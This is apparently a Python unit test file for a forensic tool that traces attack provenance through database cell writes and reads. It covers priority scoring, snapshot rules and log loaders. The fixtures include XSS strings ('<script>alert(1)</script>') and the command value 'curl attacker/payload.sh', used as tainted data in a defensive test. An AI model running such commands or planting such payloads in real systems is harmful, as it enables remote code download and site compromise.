from __future__ import annotations

import json
import tempfile
import unittest
from contextlib import redirect_stdout
from datetime import datetime, timedelta, timezone
from io import StringIO
from pathlib import Path

from analysis_cell.analyzers import HeuristicCellAnalyzer
from analysis_cell.core import build_cell_trace, build_indexes
from analysis_cell.io_utils import (
    load_read_log,
    load_request_context_log,
    load_write_log,
)
from analysis_cell.main import main
from analysis_cell.models import CellWrite, ReadEvent, RequestContext, RowDelete
from analysis_cell.priority import build_priority_trace


START = datetime(2026, 1, 1, tzinfo=timezone.utc)


def write(
    seconds: int,
    rid: str,
    column: str,
    value: object,
    sequence: int,
    operation: str = "update",
    table: str = "items",
    pk: str = "1",
    xid: int | None = None,
) -> CellWrite:
    return CellWrite(
        time=START + timedelta(seconds=seconds),
        rid=rid,
        operation=operation,
        table=table,
        pk=pk,
        column=column,
        value=value,
        sequence=sequence,
        xid=xid,
    )


def read(
    seconds: int,
    rid: str,
    sequence: int = 0,
    table: str = "items",
    pk: str = "1",
    xmin: int | None = None,
    xmax: int | None = None,
) -> ReadEvent:
    return ReadEvent(
        time=START + timedelta(seconds=seconds),
        rid=rid,
        table=table,
        pk=pk,
        sequence=sequence,
        xmin=xmin,
        xmax=xmax,
    )


class CellBacktraceTests(unittest.TestCase):
    def test_priority_deduplicates_replays_by_user_and_api(self) -> None:
        writes = [
            write(1, "R1", "payload", "first", 0, "insert"),
            write(2, "R2", "payload", "second", 1),
            write(3, "R3", "payload", "third", 2),
        ]
        indexes = build_indexes([read(4, "ROOT")], writes)
        contexts = {
            rid: RequestContext(rid, "POST /api/v1/item/<id>", "user:1")
            for rid in ("R1", "R2", "R3")
        }

        request_id = build_priority_trace("ROOT", indexes, budget=0)
        user_api = build_priority_trace(
            "ROOT",
            indexes,
            budget=0,
            request_contexts=contexts,
        )

        self.assertEqual(request_id.pending_tasks[0].writer_diversity, 3)
        self.assertEqual(user_api.pending_tasks[0].writer_diversity, 1)
        self.assertGreater(
            user_api.pending_tasks[0].rarity_score,
            request_id.pending_tasks[0].rarity_score,
        )
        self.assertEqual(user_api.priority_diversity_mode, "user_api")

    def test_request_context_loader_rejects_conflicting_rid(self) -> None:
        records = [
            {"rid": "R1", "method": "POST", "route": "/items/<id>", "user_id": "user:1"},
            {"rid": "R1", "method": "POST", "route": "/other", "user_id": "user:1"},
        ]
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory, "request_context.log")
            path.write_text(
                "".join(json.dumps(record) + "\n" for record in records),
                encoding="utf-8",
            )
            with self.assertRaisesRegex(ValueError, "same RID"):
                load_request_context_log(path)

    def test_priority_budget_prefers_rare_cell_without_pruning(self) -> None:
        writes = [
            write(1, "ATTACK", "payload", "evil", 0, "insert"),
            write(1, "N1", "heartbeat", 1, 1, "insert"),
            write(2, "N2", "heartbeat", 2, 2),
            write(3, "N3", "heartbeat", 3, 3),
        ]
        indexes = build_indexes([read(4, "ROOT")], writes)

        limited = build_priority_trace("ROOT", indexes, budget=1)
        complete = build_priority_trace("ROOT", indexes)
        basic = build_cell_trace("ROOT", indexes)

        self.assertEqual(
            [(link.parent_rid, link.cell[2]) for link in limited.links],
            [("ATTACK", "payload")],
        )
        self.assertFalse(limited.queue_exhausted)
        self.assertEqual(limited.tasks_processed, 1)
        self.assertEqual(len(limited.pending_tasks), 1)
        self.assertEqual(
            {
                (link.parent_rid, link.child_rid, link.cell)
                for link in complete.links
                if link.parent_rid != link.child_rid
            },
            {(link.parent_rid, link.child_rid, link.cell) for link in basic.links},
        )
        self.assertTrue(complete.queue_exhausted)

    def test_priority_penalizes_hot_same_origin_history(self) -> None:
        writes = [
            write(1, "ATTACK", "payload", "evil", 0, "insert"),
            write(1, "N1", "heartbeat", 1, 1, "insert"),
            write(2, "N2", "heartbeat", 2, 2),
            write(3, "N3", "heartbeat", 3, 3),
        ]
        contexts = {
            "ATTACK": RequestContext("ATTACK", "POST /payload", "user:1"),
            **{
                rid: RequestContext(rid, "POST /heartbeat", "user:1")
                for rid in ("N1", "N2", "N3")
            },
        }
        indexes = build_indexes([read(4, "ROOT")], writes)

        result = build_priority_trace(
            "ROOT",
            indexes,
            budget=1,
            request_contexts=contexts,
        )

        self.assertEqual([(link.parent_rid, link.cell[2]) for link in result.links], [
            ("ATTACK", "payload")
        ])
        heartbeat = next(
            task for task in result.pending_tasks if task.cell[2] == "heartbeat"
        )
        self.assertEqual(heartbeat.write_history_count, 3)
        self.assertLess(heartbeat.history_penalty, 1.0)

    def test_priority_penalizes_broad_child_table_scan(self) -> None:
        writes = [
            write(1, "ATTACK", "payload", "evil", 0, "insert", table="target"),
            write(1, "N1", "value", 1, 1, "insert", table="shared", pk="1"),
            write(1, "N2", "value", 2, 2, "insert", table="shared", pk="2"),
            write(1, "N3", "value", 3, 3, "insert", table="shared", pk="3"),
        ]
        reads = [
            read(2, "ROOT", sequence=0, table="target", pk="1"),
            read(2, "ROOT", sequence=1, table="shared", pk="1"),
            read(2, "ROOT", sequence=2, table="shared", pk="2"),
            read(2, "ROOT", sequence=3, table="shared", pk="3"),
        ]
        indexes = build_indexes(reads, writes)

        result = build_priority_trace("ROOT", indexes, budget=1)
        complete = build_priority_trace("ROOT", indexes)
        basic = build_cell_trace("ROOT", indexes)

        self.assertEqual([(link.parent_rid, link.cell[0]) for link in result.links], [
            ("ATTACK", "target")
        ])
        broad = next(
            task for task in result.pending_tasks if task.cell[0] == "shared"
        )
        self.assertEqual(broad.child_table_rows, 3)
        self.assertLess(broad.scan_penalty, 1.0)
        self.assertEqual(
            {(link.parent_rid, link.child_rid, link.cell) for link in complete.links},
            {(link.parent_rid, link.child_rid, link.cell) for link in basic.links},
        )

    def test_priority_delays_cells_from_an_already_exposed_edge(self) -> None:
        writes = [
            write(1, "A", "payload", "seed", 0, "insert", pk="1"),
            write(1, "A", "item_id", 1, 1, "insert", pk="1"),
            write(3, "B", "payload", "derived", 0, "insert", pk="2"),
            write(3, "B", "item_id", 2, 1, "insert", pk="2"),
        ]
        reads = [
            read(2, "B", pk="1"),
            read(4, "ROOT", pk="2"),
        ]

        limited = build_priority_trace(
            "ROOT", build_indexes(reads, writes), budget=2,
        )

        self.assertEqual(
            [(link.parent_rid, link.child_rid) for link in limited.links],
            [("B", "ROOT"), ("A", "B")],
        )
        self.assertEqual(limited.tasks_processed, 2)
        self.assertEqual(len(limited.pending_tasks), 2)

    def test_priority_promotes_bounded_two_row_lookup(self) -> None:
        writes = [
            write(1, "WIDE", "a", 1, 0, "insert", table="wide"),
            write(1, "WIDE", "b", 2, 1, "insert", table="wide"),
            write(1, "WIDE", "c", 3, 2, "insert", table="wide"),
            write(1, "REL1", "parent_id", 1, 3, "insert", table="relation", pk="1"),
            write(1, "REL2", "parent_id", 2, 4, "insert", table="relation", pk="2"),
        ]
        reads = [
            read(2, "ROOT", sequence=0, table="wide", pk="1"),
            read(2, "ROOT", sequence=1, table="relation", pk="1"),
            read(2, "ROOT", sequence=2, table="relation", pk="2"),
        ]
        indexes = build_indexes(reads, writes)

        result = build_priority_trace("ROOT", indexes, budget=1)

        self.assertEqual(result.links[0].cell[0], "relation")
        wide = next(task for task in result.pending_tasks if task.cell[0] == "wide")
        self.assertEqual(wide.child_table_rows, 1)
        self.assertEqual(wide.child_table_cells, 3)
        self.assertEqual(wide.scan_penalty, 1.0)
        self.assertEqual(wide.compactness_bonus, 1.0)
        relation = next(
            task for task in result.pending_tasks if task.cell[0] == "relation"
        )
        self.assertGreater(relation.compactness_bonus, 1.0)

    def test_priority_prefers_compact_two_row_footprint(self) -> None:
        writes = [
            write(1, "C1", "parent_id", 1, 0, "insert", table="compact", pk="1"),
            write(1, "C2", "parent_id", 2, 1, "insert", table="compact", pk="2"),
            write(1, "W1", "a", 1, 2, "insert", table="wide_two", pk="1"),
            write(1, "W1", "b", 2, 3, "insert", table="wide_two", pk="1"),
            write(1, "W2", "a", 3, 4, "insert", table="wide_two", pk="2"),
            write(1, "W2", "b", 4, 5, "insert", table="wide_two", pk="2"),
        ]
        reads = [
            read(2, "ROOT", sequence=0, table="compact", pk="1"),
            read(2, "ROOT", sequence=1, table="compact", pk="2"),
            read(2, "ROOT", sequence=2, table="wide_two", pk="1"),
            read(2, "ROOT", sequence=3, table="wide_two", pk="2"),
        ]

        result = build_priority_trace(
            "ROOT", build_indexes(reads, writes), budget=1,
        )

        self.assertEqual(result.links[0].cell[0], "compact")
        compact = next(
            task for task in result.pending_tasks if task.cell[0] == "compact"
        )
        wide = next(
            task for task in result.pending_tasks if task.cell[0] == "wide_two"
        )
        self.assertEqual((compact.child_table_cells, wide.child_table_cells), (2, 4))
        self.assertGreater(compact.compactness_bonus, wide.compactness_bonus)

    def test_priority_budget_is_monotonic(self) -> None:
        writes = [
            write(1, "B", "payload", "evil", 0, "insert"),
            write(2, "C", "status", "ready", 1, "insert"),
        ]
        indexes = build_indexes([read(3, "A")], writes)

        budget_one = build_priority_trace("A", indexes, budget=1)
        budget_two = build_priority_trace("A", indexes, budget=2)

        links_one = {(link.parent_rid, link.cell) for link in budget_one.links}
        links_two = {(link.parent_rid, link.cell) for link in budget_two.links}
        self.assertLessEqual(links_one, links_two)
        self.assertEqual(budget_two.tasks_processed, 2)
        self.assertTrue(budget_two.queue_exhausted)

    def test_priority_uncertain_pair_costs_one_task_and_does_not_recurse(self) -> None:
        writes = [
            write(1, "B", "payload", "old", 0, "insert", xid=90),
            write(2, "C", "payload", "new", 0, xid=120),
            write(0, "D", "source", "upstream", 0, "insert", table="inputs", xid=80),
        ]
        reads = [
            read(3, "A", xmin=100, xmax=150),
            read(1, "B", table="inputs", xmin=90, xmax=90),
            read(2, "C", table="inputs", xmin=100, xmax=100),
        ]

        result = build_priority_trace("A", build_indexes(reads, writes), budget=1)

        self.assertEqual(result.tasks_processed, 1)
        self.assertEqual(
            {(link.parent_rid, link.certainty) for link in result.links},
            {("B", "uncertain"), ("C", "uncertain")},
        )
        self.assertEqual(result.visited_requests, {"A"})
        self.assertTrue(result.queue_exhausted)

    def test_snapshot_order_ignores_cross_host_clock_skew(self) -> None:
        writes = [
            write(100, "B", "payload", "visible", 0, "insert", xid=10),
            write(20, "C", "payload", "future", 0, xid=12),
        ]
        result = build_cell_trace(
            "A",
            build_indexes([read(50, "A", xmin=11, xmax=12)], writes),
        )

        self.assertEqual([(link.parent_rid, link.certainty) for link in result.links], [
            ("B", "certain")
        ])
        self.assertEqual(result.links[0].resolution_reason, "snapshot-rule-2-no-window-write")

    def test_concurrent_window_keeps_all_writers_without_recursing(self) -> None:
        writes = [
            write(1, "B", "payload", "old", 0, "insert", xid=90),
            write(2, "C", "payload", "middle", 0, xid=102),
            write(3, "D", "payload", "visible", 0, xid=104),
            write(4, "E", "payload", "in-progress", 0, xid=105),
            write(0, "D", "source", "upstream", 0, "insert", table="inputs", xid=80),
        ]
        reads = [
            read(5, "A", xmin=102, xmax=106),
            read(1, "B", table="inputs", xmin=90, xmax=90),
            read(2, "C", table="inputs", xmin=100, xmax=100),
        ]
        result = build_cell_trace("A", build_indexes(reads, writes))

        self.assertEqual(
            {(link.parent_rid, link.certainty) for link in result.links},
            {
                ("B", "uncertain"),
                ("C", "uncertain"),
                ("D", "uncertain"),
                ("E", "uncertain"),
            },
        )
        self.assertEqual(result.visited_requests, {"A"})
        self.assertEqual(result.request_ids, {"A"})
        self.assertEqual(result.graph_request_ids, {"A", "B", "C", "D", "E"})
        self.assertEqual(result.suppressed["uncertain-no-recurse"], 4)

    def test_same_value_window_resolves_to_origin(self) -> None:
        writes = [
            write(1, "B", "payload", "same", 0, "insert", xid=90),
            write(2, "C", "payload", "same", 0, xid=120),
        ]
        result = build_cell_trace(
            "A",
            build_indexes([read(3, "A", xmin=100, xmax=150)], writes),
        )

        self.assertEqual(len(result.links), 1)
        self.assertEqual(result.links[0].parent_rid, "B")
        self.assertEqual(result.links[0].latest_write.rid, "C")
        self.assertEqual(result.links[0].certainty, "certain")
        self.assertEqual(
            result.links[0].resolution_reason,
            "snapshot-rule-3-same-value-origin",
        )

    def test_first_window_version_is_certain_when_read_proves_row_exists(self) -> None:
        writes = [write(2, "C", "payload", "new", 0, "insert", xid=120)]
        result = build_cell_trace(
            "A",
            build_indexes([read(3, "A", xmin=100, xmax=150)], writes),
        )

        self.assertEqual(len(result.links), 1)
        self.assertEqual(result.links[0].parent_rid, "C")
        self.assertEqual(result.links[0].certainty, "certain")
        self.assertEqual(result.links[0].resolution_reason, "snapshot-rule-1-row-exists")

    def test_missing_lower_bound_still_keeps_every_window_writer(self) -> None:
        writes = [
            write(1, "B", "payload", "middle", 0, xid=102),
            write(2, "C", "payload", "visible", 0, xid=104),
            write(3, "D", "payload", "in-progress", 0, xid=105),
        ]
        result = build_cell_trace(
            "A",
            build_indexes([read(4, "A", xmin=102, xmax=106)], writes),
        )

        self.assertEqual(
            {(link.parent_rid, link.certainty) for link in result.links},
            {
                ("B", "uncertain"),
                ("C", "uncertain"),
                ("D", "uncertain"),
            },
        )

    def test_different_columns_keep_different_writers(self) -> None:
        writes = [
            write(1, "B", "payload", "<script>alert(1)</script>", 0, "insert"),
            write(1, "B", "title", "normal", 1, "insert"),
            write(2, "C", "status", "enabled", 2),
        ]
        # C intentionally has no read event. Its write must not hide B.payload.
        indexes = build_indexes([read(3, "A")], writes)
        result = build_cell_trace("A", indexes)

        links = {(link.parent_rid, link.cell[2]) for link in result.links}
        self.assertEqual(
            links,
            {("B", "payload"), ("B", "title"), ("C", "status")},
        )
        self.assertEqual(result.visited_requests, {"A", "B", "C"})

    def test_llm_prunes_each_cell_and_recurses_only_through_taint(self) -> None:
        writes = [
            write(
                1,
                "D",
                "command",
                "curl attacker/payload.sh",
                0,
                "insert",
                table="inputs",
                pk="9",
            ),
            write(3, "B", "payload", "<script>alert(1)</script>", 1, "insert"),
            write(3, "B", "title", "normal", 2, "insert"),
            write(4, "C", "status", "enabled", 3),
        ]
        reads = [
            read(2, "B", table="inputs", pk="9"),
            read(5, "A"),
        ]
        result = build_cell_trace(
            "A",
            build_indexes(reads, writes),
            analyzer=HeuristicCellAnalyzer(),
            attack_description="XSS payload",
        )

        links = {(link.parent_rid, link.child_rid, link.cell[2]) for link in result.links}
        self.assertEqual(
            links,
            {
                ("B", "A", "payload"),
                ("D", "B", "command"),
            },
        )
        self.assertEqual(result.visited_requests, {"A", "B", "D"})
        self.assertEqual(
            {item.candidate.cell[2] for item in result.pruned_cells},
            {"status", "title"},
        )

    def test_origin_is_start_of_current_value_run(self) -> None:
        writes = [
            write(1, "B", "payload", "evil", 0, "insert"),
            write(2, "C", "payload", "evil", 1),
            write(3, "D", "status", "new", 2),
        ]
        result = build_cell_trace(
            "A",
            build_indexes([read(4, "A")], writes),
        )
        payload = next(link for link in result.links if link.cell[2] == "payload")
        self.assertEqual(payload.latest_write.rid, "C")
        self.assertEqual(payload.origin_write.rid, "B")
        self.assertEqual(payload.parent_rid, "B")

    def test_origin_does_not_cross_changed_value_or_delete(self) -> None:
        changed_writes = [
            write(1, "B", "payload", "evil", 0, "insert"),
            write(2, "C", "payload", "safe", 1),
            write(3, "D", "payload", "evil", 2),
        ]
        changed = build_cell_trace(
            "A",
            build_indexes([read(4, "A")], changed_writes),
        )
        self.assertEqual(changed.links[0].parent_rid, "D")

        deleted_writes = [
            write(1, "B", "payload", "evil", 0, "insert"),
            write(2, "D", "payload", "evil", 1, "insert"),
        ]
        deletes = [RowDelete(START + timedelta(seconds=2), "C", "items", "1", 0)]
        deleted = build_cell_trace(
            "A",
            build_indexes([read(3, "A")], deleted_writes, deletes),
        )
        self.assertEqual(deleted.links[0].parent_rid, "D")

    def test_loader_rejects_legacy_row_only_write_log(self) -> None:
        record = {
            "time": START.isoformat(),
            "event": "update",
            "rid": "B",
            "tbn": "items",
            "pks": [1],
        }
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory, "write.log")
            path.write_text(json.dumps(record) + "\n", encoding="utf-8")
            with self.assertRaisesRegex(ValueError, "legacy row-level log"):
                load_write_log(path)

    def test_loaders_preserve_snapshot_and_transaction_order_fields(self) -> None:
        read_record = {
            "time": START.isoformat(),
            "event": "select",
            "rid": "A",
            "tbn": "items",
            "pks": [1],
            "seq": 7,
            "xmin": 100,
            "xmax": 130,
        }
        write_record = {
            "time": START.isoformat(),
            "event": "update",
            "rid": "B",
            "tbn": "items",
            "pk": 1,
            "xid": 120,
            "seq": 3,
            "cells": [{"col": "payload", "new": "value"}],
        }
        with tempfile.TemporaryDirectory() as directory:
            read_path = Path(directory, "read.log")
            write_path = Path(directory, "write.log")
            read_path.write_text(json.dumps(read_record) + "\n", encoding="utf-8")
            write_path.write_text(json.dumps(write_record) + "\n", encoding="utf-8")

            reads = load_read_log(read_path)
            writes, _ = load_write_log(write_path)

        self.assertEqual((reads[0].sequence, reads[0].xmin, reads[0].xmax), (7, 100, 130))
        self.assertEqual((writes[0].sequence, writes[0].xid), (3, 120))

    def test_cli_writes_cell_level_dot_and_json(self) -> None:
        read_record = {
            "time": (START + timedelta(seconds=3)).isoformat(),
            "event": "select",
            "rid": "A",
            "tbn": "items",
            "pks": [1],
        }
        write_records = [
            {
                "time": (START + timedelta(seconds=1)).isoformat(),
                "event": "insert",
                "rid": "B",
                "tbn": "items",
                "pk": 1,
                "cells": [
                    {"col": "payload", "new": "<script>alert(1)</script>"},
                    {"col": "title", "new": "normal"},
                ],
            },
            {
                "time": (START + timedelta(seconds=2)).isoformat(),
                "event": "update",
                "rid": "C",
                "tbn": "items",
                "pk": 1,
                "cells": [{"col": "status", "new": "enabled"}],
            },
        ]
        with tempfile.TemporaryDirectory() as directory:
            directory_path = Path(directory)
            read_path = directory_path / "read.log"
            write_path = directory_path / "write.log"
            dot_path = directory_path / "trace.html"
            json_path = directory_path / "trace.json"
            read_path.write_text(json.dumps(read_record) + "\n", encoding="utf-8")
            write_path.write_text(
                "".join(json.dumps(record) + "\n" for record in write_records),
                encoding="utf-8",
            )

            with redirect_stdout(StringIO()):
                exit_code = main([
                    "--mode",
                    "llm",
                    "--llm-provider",
                    "heuristic",
                    "--read-log",
                    str(read_path),
                    "--write-log",
                    str(write_path),
                    "--root-rid",
                    "A",
                    "--output-dot",
                    str(dot_path),
                    "--output-json",
                    str(json_path),
                ])

            self.assertEqual(exit_code, 0)
            result = json.loads(json_path.read_text(encoding="utf-8"))
            self.assertEqual(result["mode"], "llm")
            self.assertEqual(
                [
                    (
                        link["parent_rid"],
                        link["child_rid"],
                        link["cell"]["column"],
                    )
                    for link in result["links"]
                ],
                [("B", "A", "payload")],
            )
            dot_text = dot_path.read_text(encoding="utf-8")
            self.assertIn("<!DOCTYPE html>", dot_text)
            self.assertIn("items[1].payload", dot_text)
            # Each request RID appears exactly once in the rendered graph data
            self.assertEqual(dot_text.count('"name": "A"'), 1)
            self.assertEqual(dot_text.count('"name": "B"'), 1)


if __name__ == "__main__":
    unittest.main()
